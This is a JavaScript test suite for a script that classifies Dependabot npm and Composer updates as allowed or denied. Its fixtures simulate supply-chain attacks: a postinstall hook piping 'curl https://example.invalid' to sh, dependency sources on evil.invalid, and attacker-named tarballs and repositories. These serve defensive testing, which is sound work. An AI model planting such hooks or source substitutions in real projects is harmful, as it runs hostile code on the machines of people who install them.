import assert from 'node:assert/strict';
import { chmodSync, cpSync, mkdtempSync, mkdirSync, readFileSync, renameSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import { spawnSync } from 'node:child_process';
import test from 'node:test';
import { classifyDependabotUpdate } from '../scripts/classify-dependabot-update.mjs';

const fixtures = resolve('tests/fixtures/dependabot');

function json(path) {
	return JSON.parse(readFileSync(path, 'utf8'));
}

function writeJson(path, value) {
	writeFileSync(path, `${JSON.stringify(value, null, 2)}\n`);
}

function scenario(ecosystem, mutate) {
	const root = mkdtempSync(join(tmpdir(), `dependabot-${ecosystem}-`));
	const baseDir = join(root, 'base');
	const headDir = join(root, 'head');
	cpSync(join(fixtures, ecosystem, 'base'), baseDir, { recursive: true });
	cpSync(baseDir, headDir, { recursive: true });
	mutate(headDir, baseDir);
	return {
		baseDir,
		headDir,
		cleanup: () => rmSync(root, { recursive: true, force: true }),
	};
}

function npmUpdate(headDir, version) {
	const manifestPath = join(headDir, 'package.json');
	const lockPath = join(headDir, 'package-lock.json');
	const manifest = json(manifestPath);
	const lock = json(lockPath);
	manifest.devDependencies['example-linter'] = version;
	lock.packages[''].devDependencies['example-linter'] = version;
	lock.packages['node_modules/example-linter'].version = version;
	lock.packages['node_modules/example-linter'].resolved = `https://registry.npmjs.org/example-linter/-/example-linter-${version}.tgz`;
	writeJson(manifestPath, manifest);
	writeJson(lockPath, lock);
}

function composerUpdate(headDir, version) {
	const manifestPath = join(headDir, 'composer.json');
	const lockPath = join(headDir, 'composer.lock');
	const manifest = json(manifestPath);
	const lock = json(lockPath);
	manifest['require-dev']['vendor/tester'] = version;
	lock['content-hash'] = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';
	lock['packages-dev'][0].version = version;
	lock['packages-dev'][0].source.reference = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';
	lock['packages-dev'][0].dist.reference = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';
	lock['packages-dev'][0].dist.url = 'https://api.github.com/repos/vendor/tester/zipball/bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';
	writeJson(manifestPath, manifest);
	writeJson(lockPath, lock);
}

function codes(evidence) {
	return evidence.reasons.map(({ code }) => code);
}

test('allows a bounded npm development patch and emits stable evidence', () => {
	const fixture = scenario('npm', (head) => npmUpdate(head, '2.3.5'));
	try {
		const result = classifyDependabotUpdate(fixture);
		assert.equal(result.decision, 'allow');
		assert.equal(result.ecosystem, 'npm');
		assert.deepEqual(result.changed_files, ['package-lock.json', 'package.json']);
		assert.deepEqual(result.updates, [{ name: 'example-linter', from: '2.3.4', to: '2.3.5', level: 'patch', direct: true }]);
		assert.deepEqual(result.reasons, []);
	} finally {
		fixture.cleanup();
	}
});

test('allows a bounded Composer development patch', () => {
	const fixture = scenario('composer', (head) => composerUpdate(head, '2.3.5'));
	try {
		assert.equal(classifyDependabotUpdate(fixture).decision, 'allow');
	} finally {
		fixture.cleanup();
	}
});

test('allows a transitive-only development patch without changing direct dependencies', () => {
	const fixture = scenario('npm', (head) => {
		const path = join(head, 'package-lock.json');
		const lock = json(path);
		lock.packages['node_modules/example-parser'].version = '1.1.1';
		lock.packages['node_modules/example-parser'].resolved = 'https://registry.npmjs.org/example-parser/-/example-parser-1.1.1.tgz';
		writeJson(path, lock);
	});
	try {
		const result = classifyDependabotUpdate(fixture);
		assert.equal(result.decision, 'allow');
		assert.deepEqual(result.updates, [{ name: 'example-parser', from: '1.1.0', to: '1.1.1', level: 'patch', direct: false }]);
	} finally {
		fixture.cleanup();
	}
});

test('denies minor updates by default and allows them only through explicit policy', () => {
	const fixture = scenario('npm', (head) => npmUpdate(head, '2.4.0'));
	try {
		const denied = classifyDependabotUpdate(fixture);
		assert.equal(denied.decision, 'deny');
		assert.ok(codes(denied).includes('disallowed_version_change'));
		const allowed = classifyDependabotUpdate({ ...fixture, policy: json(join(fixtures, 'allow-minor.json')) });
		assert.equal(allowed.decision, 'allow');
	} finally {
		fixture.cleanup();
	}
});

test('denies major versions, downgrades, and non-semantic versions even with minor policy', () => {
	for (const version of ['3.0.0', '2.3.3', 'next']) {
		const fixture = scenario('npm', (head) => npmUpdate(head, version));
		try {
			const result = classifyDependabotUpdate({ ...fixture, policy: { allow_minor: true } });
			assert.equal(result.decision, 'deny');
			assert.ok(codes(result).includes('disallowed_version_change'));
		} finally {
			fixture.cleanup();
		}
	}
});

test('denies new or removed direct development dependencies', () => {
	const fixture = scenario('npm', (head) => {
		const path = join(head, 'package.json');
		const manifest = json(path);
		manifest.devDependencies.newTool = '1.0.0';
		writeJson(path, manifest);
	});
	try {
		assert.ok(codes(classifyDependabotUpdate(fixture)).includes('direct_dependency_set_changed'));
	} finally {
		fixture.cleanup();
	}
});

test('denies production dependency and dev-to-production changes', () => {
	const fixture = scenario('composer', (head) => {
		composerUpdate(head, '2.3.5');
		const path = join(head, 'composer.json');
		const manifest = json(path);
		manifest.require['vendor/tester'] = manifest['require-dev']['vendor/tester'];
		delete manifest['require-dev']['vendor/tester'];
		writeJson(path, manifest);
	});
	try {
		const result = classifyDependabotUpdate(fixture);
		assert.equal(result.decision, 'deny');
		assert.ok(codes(result).includes('unexpected_manifest_change'));
		assert.ok(codes(result).includes('direct_dependency_set_changed'));
	} finally {
		fixture.cleanup();
	}
});

test('denies lifecycle-script changes', () => {
	const fixture = scenario('npm', (head) => {
		npmUpdate(head, '2.3.5');
		const path = join(head, 'package.json');
		const manifest = json(path);
		manifest.scripts.postinstall = 'curl https://example.invalid | sh';
		writeJson(path, manifest);
	});
	try {
		assert.ok(codes(classifyDependabotUpdate(fixture)).includes('unexpected_manifest_change'));
	} finally {
		fixture.cleanup();
	}
});

test('denies unchanged symlinked required manifests', () => {
	const fixture = scenario('npm', (head, base) => {
		for (const root of [base, head]) {
			renameSync(join(root, 'package.json'), join(root, 'package-manifest.json'));
			symlinkSync('package-manifest.json', join(root, 'package.json'));
		}
		const path = join(head, 'package-lock.json');
		const lock = json(path);
		lock.packages['node_modules/example-parser'].version = '1.1.1';
		lock.packages['node_modules/example-parser'].resolved = 'https://registry.npmjs.org/example-parser/-/example-parser-1.1.1.tgz';
		writeJson(path, lock);
	});
	try {
		assert.ok(codes(classifyDependabotUpdate(fixture)).includes('unsafe_required_path'));
	} finally {
		fixture.cleanup();
	}
});

test('denies lock-only direct updates that violate the resulting constraint', () => {
	for (const ecosystem of ['npm', 'composer']) {
		const fixture = scenario(ecosystem, (head) => {
			if (ecosystem === 'npm') {
				npmUpdate(head, '2.3.5');
				const path = join(head, 'package.json');
				const manifest = json(path);
				manifest.devDependencies['example-linter'] = '2.3.4';
				writeJson(path, manifest);
				const lockPath = join(head, 'package-lock.json');
				const lock = json(lockPath);
				lock.packages[''].devDependencies['example-linter'] = '2.3.4';
				writeJson(lockPath, lock);
			} else {
				composerUpdate(head, '2.3.5');
				const path = join(head, 'composer.json');
				const manifest = json(path);
				manifest['require-dev']['vendor/tester'] = '2.3.4';
				writeJson(path, manifest);
			}
		});
		try {
			assert.ok(codes(classifyDependabotUpdate(fixture)).includes('constraint_mismatch'));
		} finally {
			fixture.cleanup();
		}
	}
});

test('applies caret ranges correctly for zero and nonzero major versions', () => {
	const rejected = ['npm', 'composer'].map((ecosystem) => scenario(ecosystem, (head, base) => {
		const configure = (root, version) => {
			if (ecosystem === 'npm') {
				npmUpdate(root, version);
				const manifestPath = join(root, 'package.json');
				const manifest = json(manifestPath);
				manifest.devDependencies['example-linter'] = '^0.0.3';
				writeJson(manifestPath, manifest);
				const lockPath = join(root, 'package-lock.json');
				const lock = json(lockPath);
				lock.packages[''].devDependencies['example-linter'] = '^0.0.3';
				writeJson(lockPath, lock);
			} else {
				composerUpdate(root, version);
				const manifestPath = join(root, 'composer.json');
				const manifest = json(manifestPath);
				manifest['require-dev']['vendor/tester'] = '^0.0.3';
				writeJson(manifestPath, manifest);
			}
		};
		configure(base, '0.0.3');
		configure(head, '0.0.4');
	}));
	const allowed = scenario('npm', (head) => {
		npmUpdate(head, '2.4.0');
		const path = join(head, 'package.json');
		const manifest = json(path);
		manifest.devDependencies['example-linter'] = '^2.3.4';
		writeJson(path, manifest);
		const lockPath = join(head, 'package-lock.json');
		const lock = json(lockPath);
		lock.packages[''].devDependencies['example-linter'] = '^2.3.4';
		writeJson(lockPath, lock);
	});
	try {
		for (const fixture of rejected) {
			assert.ok(codes(classifyDependabotUpdate(fixture)).includes('constraint_mismatch'));
		}
		assert.equal(classifyDependabotUpdate({ ...allowed, policy: { allow_minor: true } }).decision, 'allow');
	} finally {
		for (const fixture of rejected) fixture.cleanup();
		allowed.cleanup();
	}
});

test('denies URL specifiers and dependency install scripts', () => {
	const unsafeSource = scenario('npm', (head) => {
		npmUpdate(head, '2.3.5');
		const manifestPath = join(head, 'package.json');
		const lockPath = join(head, 'package-lock.json');
		const manifest = json(manifestPath);
		const lock = json(lockPath);
		manifest.devDependencies['example-linter'] = 'https://evil.invalid/tool.tgz';
		lock.packages[''].devDependencies['example-linter'] = manifest.devDependencies['example-linter'];
		writeJson(manifestPath, manifest);
		writeJson(lockPath, lock);
	});
	try {
		assert.ok(codes(classifyDependabotUpdate(unsafeSource)).includes('unsafe_dependency_source'));
	} finally {
		unsafeSource.cleanup();
	}

	const installScript = scenario('npm', (head) => {
		npmUpdate(head, '2.3.5');
		const path = join(head, 'package-lock.json');
		const lock = json(path);
		lock.packages['node_modules/example-linter'].hasInstallScript = true;
		writeJson(path, lock);
	});
	try {
		assert.ok(codes(classifyDependabotUpdate(installScript)).includes('dependency_executes_install_code'));
	} finally {
		installScript.cleanup();
	}
});

test('denies npm updates without canonical registry integrity', () => {
	for (const mutate of [
		(record) => { delete record.resolved; delete record.integrity; },
		(record) => { record.link = true; },
	]) {
		const fixture = scenario('npm', (head) => {
			npmUpdate(head, '2.3.5');
			const path = join(head, 'package-lock.json');
			const lock = json(path);
			mutate(lock.packages['node_modules/example-linter']);
			writeJson(path, lock);
		});
		try {
			assert.equal(classifyDependabotUpdate(fixture).decision, 'deny');
		} finally {
			fixture.cleanup();
		}
	}
});

test('denies npm tarballs that do not match the package name and version', () => {
	const fixture = scenario('npm', (head) => {
		npmUpdate(head, '2.3.5');
		const path = join(head, 'package-lock.json');
		const lock = json(path);
		lock.packages['node_modules/example-linter'].resolved = 'https://registry.npmjs.org/attacker-tool/-/attacker-tool-2.3.5.tgz';
		writeJson(path, lock);
	});
	try {
		assert.ok(codes(classifyDependabotUpdate(fixture)).includes('unsafe_dependency_source'));
	} finally {
		fixture.cleanup();
	}
});

test('classifies nested packages by exact path rather than a direct dependency name', () => {
	const fixture = scenario('npm', (head, base) => {
		for (const root of [base, head]) {
			const path = join(root, 'package-lock.json');
			const lock = json(path);
			lock.packages['node_modules/example-linter'].dependencies.container = '1.0.0';
			lock.packages['node_modules/container'] = {
				version: '1.0.0',
				resolved: 'https://registry.npmjs.org/container/-/container-1.0.0.tgz',
				integrity: 'sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==',
				dev: true,
				dependencies: { 'example-linter': root === base ? '1.0.0' : '9.0.0' },
			};
			lock.packages['node_modules/container/node_modules/example-linter'] = {
				version: root === base ? '1.0.0' : '9.0.0',
				resolved: `https://registry.npmjs.org/example-linter/-/example-linter-${root === base ? '1.0.0' : '9.0.0'}.tgz`,
				integrity: 'sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==',
				dev: true,
			};
			writeJson(path, lock);
		}
		npmUpdate(head, '2.3.5');
	});
	try {
		const result = classifyDependabotUpdate(fixture);
		assert.equal(result.decision, 'deny');
		assert.ok(result.updates.some(({ from, to, level }) => from === '1.0.0' && to === '9.0.0' && level === 'major'));
	} finally {
		fixture.cleanup();
	}
});

test('denies Composer source and distribution substitution', () => {
	for (const mutate of [
		(record) => {
			record.source.url = 'https://evil.invalid/tool.git';
			record.dist.url = 'https://evil.invalid/tool.zip';
		},
		(record) => {
			record.dist.url = `https://api.github.com/repos/attacker/tool/zipball/${record.dist.reference}`;
		},
		(record) => {
			record.source.url = 'https://github.com/attacker/tool.git';
			record.dist.url = `https://api.github.com/repos/attacker/tool/zipball/${record.dist.reference}`;
		},
	]) {
		const fixture = scenario('composer', (head) => {
			composerUpdate(head, '2.3.5');
			const path = join(head, 'composer.lock');
			const lock = json(path);
			mutate(lock['packages-dev'][0]);
			writeJson(path, lock);
		});
		try {
			assert.ok(codes(classifyDependabotUpdate(fixture)).includes('unsafe_dependency_source'));
		} finally {
			fixture.cleanup();
		}
	}
});

test('denies workflow and other protected-path changes', () => {
	const fixture = scenario('npm', (head) => {
		npmUpdate(head, '2.3.5');
		mkdirSync(join(head, '.github/workflows'), { recursive: true });
		writeFileSync(join(head, '.github/workflows/ci.yml'), 'permissions: write-all\n');
	});
	try {
		const result = classifyDependabotUpdate(fixture);
		assert.equal(result.decision, 'deny');
		assert.ok(codes(result).includes('protected_path_changed'));
	} finally {
		fixture.cleanup();
	}
});

test('denies changed binaries and symbolic links', () => {
	const binary = scenario('npm', (head) => {
		npmUpdate(head, '2.3.5');
		writeFileSync(join(head, 'payload.bin'), Buffer.from([0, 1, 2]));
	});
	try {
		assert.ok(codes(classifyDependabotUpdate(binary)).includes('binary_change'));
	} finally {
		binary.cleanup();
	}

	const symlink = scenario('npm', (head) => {
		npmUpdate(head, '2.3.5');
		symlinkSync('package.json', join(head, 'unexpected-link'));
	});
	try {
		assert.ok(codes(classifyDependabotUpdate(symlink)).includes('unsafe_file_type'));
	} finally {
		symlink.cleanup();
	}
});

test('denies executable-mode changes and added directory entries', () => {
	const executable = scenario('npm', (head) => {
		npmUpdate(head, '2.3.5');
		chmodSync(join(head, 'package.json'), 0o755);
	});
	try {
		assert.ok(codes(classifyDependabotUpdate(executable)).includes('unsafe_file_mode'));
	} finally {
		executable.cleanup();
	}

	const directory = scenario('npm', (head) => {
		npmUpdate(head, '2.3.5');
		mkdirSync(join(head, 'embedded-repository'));
	});
	try {
		assert.ok(codes(classifyDependabotUpdate(directory)).includes('unsafe_file_type'));
	} finally {
		directory.cleanup();
	}
});

test('denies malformed and unexpected npm lockfile changes', () => {
	const malformed = scenario('npm', (head) => writeFileSync(join(head, 'package-lock.json'), '{nope'));
	try {
		assert.ok(codes(classifyDependabotUpdate(malformed)).includes('invalid_json'));
	} finally {
		malformed.cleanup();
	}

	const mutation = scenario('npm', (head) => {
		npmUpdate(head, '2.3.5');
		const path = join(head, 'package-lock.json');
		const lock = json(path);
		lock.packages['node_modules/example-parser'].resolved = 'https://evil.invalid/parser.tgz';
		writeJson(path, lock);
	});
	try {
		assert.ok(codes(classifyDependabotUpdate(mutation)).includes('unexpected_lock_record_change'));
	} finally {
		mutation.cleanup();
	}
});

test('denies malformed and production Composer lockfile changes', () => {
	const malformed = scenario('composer', (head) => {
		composerUpdate(head, '2.3.5');
		const path = join(head, 'composer.lock');
		const lock = json(path);
		lock['content-hash'] = 'not-a-composer-hash';
		writeJson(path, lock);
	});
	try {
		assert.ok(codes(classifyDependabotUpdate(malformed)).includes('invalid_lockfile'));
	} finally {
		malformed.cleanup();
	}

	const production = scenario('composer', (head) => {
		composerUpdate(head, '2.3.5');
		const path = join(head, 'composer.lock');
		const lock = json(path);
		lock.packages[0].version = '1.0.1';
		writeJson(path, lock);
	});
	try {
		assert.ok(codes(classifyDependabotUpdate(production)).includes('production_lock_changed'));
	} finally {
		production.cleanup();
	}
});

test('denies unreachable injected lock entries and non-development lock entries', () => {
	for (const transform of [
		(lock) => { lock.packages['node_modules/injected'] = { version: '1.0.0', dev: true }; },
		(lock) => { lock.packages['node_modules/example-parser'].dev = false; },
	]) {
		const fixture = scenario('npm', (head) => {
			npmUpdate(head, '2.3.5');
			const path = join(head, 'package-lock.json');
			const lock = json(path);
			transform(lock);
			writeJson(path, lock);
		});
		try {
			assert.equal(classifyDependabotUpdate(fixture).decision, 'deny');
		} finally {
			fixture.cleanup();
		}
	}
});

test('denies unchanged trees, mixed ecosystems, and unknown policy keys', () => {
	const unchanged = scenario('npm', () => {});
	try {
		assert.ok(codes(classifyDependabotUpdate(unchanged)).includes('no_supported_update'));
	} finally {
		unchanged.cleanup();
	}

	const mixed = scenario('npm', (head) => {
		npmUpdate(head, '2.3.5');
		cpSync(join(fixtures, 'composer/base/composer.json'), join(head, 'composer.json'));
		cpSync(join(fixtures, 'composer/base/composer.lock'), join(head, 'composer.lock'));
	});
	try {
		assert.ok(codes(classifyDependabotUpdate(mixed)).includes('multiple_ecosystems'));
		assert.equal(classifyDependabotUpdate({ ...mixed, policy: { typo: true } }).decision, 'deny');
	} finally {
		mixed.cleanup();
	}
});

test('CLI emits JSON evidence and uses allow/deny exit statuses', () => {
	const fixture = scenario('composer', (head) => composerUpdate(head, '2.3.5'));
	try {
		const command = spawnSync(process.execPath, [
			resolve('scripts/classify-dependabot-update.mjs'),
			'--base-dir', fixture.baseDir,
			'--head-dir', fixture.headDir,
		], { encoding: 'utf8' });
		assert.equal(command.status, 0, command.stderr);
		assert.equal(JSON.parse(command.stdout).decision, 'allow');
	} finally {
		fixture.cleanup();
	}
});
